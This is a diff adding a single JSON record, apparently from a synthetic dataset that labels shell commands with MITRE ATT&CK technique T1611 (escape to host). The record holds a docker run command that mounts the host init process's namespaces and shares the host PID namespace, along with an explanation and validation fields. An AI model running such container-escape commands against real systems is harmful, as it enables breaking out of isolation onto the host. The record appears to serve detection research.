@@ -1,0 +1,21 @@
+{
+  "id": "SYN-ZSH-T1611-690e094d-b5e39d66",
+  "technique_id": "T1611",
+  "platform": "macos",
+  "shell": "zsh",
+  "command": "docker run -v /proc/1/ns:/host/ns --pid host -it alpine",
+  "explanation": "This command runs a Docker container and mounts the /proc directory of the host's init process (PID 1), which could be used to manipulate the host's kernel and process namespace information.",
+  "rationale_steps": [
+    "Run a Docker container mounting the host's process namespace.",
+    "Access key namespace information of the host system."
+  ],
+  "source_prompt_hash": "690e094d",
+  "obfuscation_level": "none",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  },
+  "timestamp_utc": "2025-07-07T00:33:07.598350Z"
+}
